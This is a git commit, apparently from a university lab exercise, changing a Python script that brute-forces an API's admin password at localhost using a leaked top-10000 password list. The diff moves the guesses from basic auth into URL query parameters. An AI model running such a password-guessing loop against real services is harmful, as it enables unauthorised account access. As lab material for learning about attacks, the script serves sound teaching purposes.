f5f2de77191603d5829b100e07572c6d665befff
Edyta Czesnowska <w.czesnowski.627@studms.ug.pl>
2025-03-04 15:44:19 +0100

    LAB01 zad3

--- LAB01/apiattack.py
+++ LAB01/apiattack.py
@@ -1,7 +1,7 @@
 import requests as request
 with open("darkweb2017-top10000.txt", "r") as file:
     for line in file:
-        attempt = request.get("http://localhost:4000/users", auth=("admin", line.strip()))
+        attempt = request.get(f"http://localhost:4000/users?login=admin&pass={line.strip()}")
         if attempt.status_code == 200:
             print("Password found: " + line.strip())
             break
